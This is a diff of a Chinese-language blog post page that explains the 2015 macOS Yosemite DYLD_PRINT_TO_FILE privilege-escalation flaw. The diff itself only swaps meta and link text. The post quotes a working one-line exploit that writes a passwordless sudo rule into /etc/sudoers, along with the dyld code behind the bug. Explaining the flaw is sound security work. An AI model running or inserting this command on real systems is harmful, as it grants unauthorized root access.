@@ -47,12 +47,12 @@
   };
 </script>
 
-  <meta name="description" content="昨晚在最新版苹果OS X10.10曝权限提升0day漏洞上看到一篇mac下恶意软件的分析文章，软件利用前段时间有报道过的DYLD_PRINT_TO_FILE环境变量来实现本地提权免密码root安装。脚本思路大致如下：">
+  <meta name="description" content="昨晚在freebuf上看到一篇mac下恶意软件的分析文章，软件利用前段时间有报道过的DYLD_PRINT_TO_FILE环境变量来实现本地提权免密码root安装。脚本思路大致如下：">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Mac OSX yosemite本地提权漏洞">
 <meta property="og:url" content="https://badb100d.com/2015/08/07/2015-08-07/">
 <meta property="og:site_name" content="神经慢游者">
-<meta property="og:description" content="昨晚在最新版苹果OS X10.10曝权限提升0day漏洞上看到一篇mac下恶意软件的分析文章，软件利用前段时间有报道过的DYLD_PRINT_TO_FILE环境变量来实现本地提权免密码root安装。脚本思路大致如下：">
+<meta property="og:description" content="昨晚在freebuf上看到一篇mac下恶意软件的分析文章，软件利用前段时间有报道过的DYLD_PRINT_TO_FILE环境变量来实现本地提权免密码root安装。脚本思路大致如下：">
 <meta property="og:locale">
 <meta property="article:published_time" content="2015-08-07T10:08:00.000Z">
 <meta property="article:modified_time" content="2015-08-07T10:08:01.000Z">
@@ -274,7 +274,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>昨晚在<span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9uZXdzLzc0MTgwLmh0bWw=" title="http://www.freebuf.com/news/74180.html">最新版苹果OS X10.10曝权限提升0day漏洞<i class="fa fa-external-link"></i></span>上看到一篇mac下恶意软件的分析文章，软件利用前段时间有报道过的<strong>DYLD_PRINT_TO_FILE</strong>环境变量来实现本地提权免密码root安装。<br>脚本思路大致如下：</p>
+        <p>昨晚在<span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9uZXdzLzc0MTgwLmh0bWw=" title="http://www.freebuf.com/news/74180.html">freebuf<i class="fa fa-external-link"></i></span>上看到一篇mac下恶意软件的分析文章，软件利用前段时间有报道过的<strong>DYLD_PRINT_TO_FILE</strong>环境变量来实现本地提权免密码root安装。<br>脚本思路大致如下：</p>
 <figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;echo \&quot;<span class="subst">$(whoami)</span> ALL=(ALL) NOPASSWD:ALL\&quot; &gt;&amp;3 &quot;</span>|DYLD_PRINT_TO_FILE=/etc/sudoers newgrp;sudo -s dosomethingroot</span><br></pre></td></tr></table></figure>
 <p><span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXIuYXBwbGUuY29tL2xpYnJhcnkvcHJlcmVsZWFzZS9tYWMvZG9jdW1lbnRhdGlvbi9EYXJ3aW4vUmVmZXJlbmNlL01hblBhZ2VzL21hbjEvZHlsZC4xLmh0bWw=" title="https://developer.apple.com/library/prerelease/mac/documentation/Darwin/Reference/ManPages/man1/dyld.1.html">DYLD<i class="fa fa-external-link"></i></span>全称dynamic link editor，听名字是实现类似动态链接库加载的东西，<strong>DYLD_PRINT_TO_FILE</strong>是苹果在OSX 10.10加入的一个新特性，主要功能是实现将dyld进程的错误日志重定向到此环境变量指定的可写文件。不过添加这个特性的时候貌似没把它加在有安全验证的代码范围内而是直接写在dyld的main里了。。</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//大致添加的代码</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* loggingPath = _simple_getenv(envp, <span class="string">&quot;DYLD_PRINT_TO_FILE&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( loggingPath != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">        <span class="keyword">int</span> fd = open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, <span class="number">0644</span>);</span><br><span class="line">        <span class="keyword">if</span> ( fd != <span class="number">-1</span> ) &#123;</span><br><span class="line">                sLogfile = fd;</span><br><span class="line">                sLogToFile = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">                dyld::<span class="built_in">log</span>(<span class="string">&quot;dyld: could not open DYLD_PRINT_TO_FILE=&#x27;%s&#x27;, errno=%d\n&quot;</span>, loggingPath, errno);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
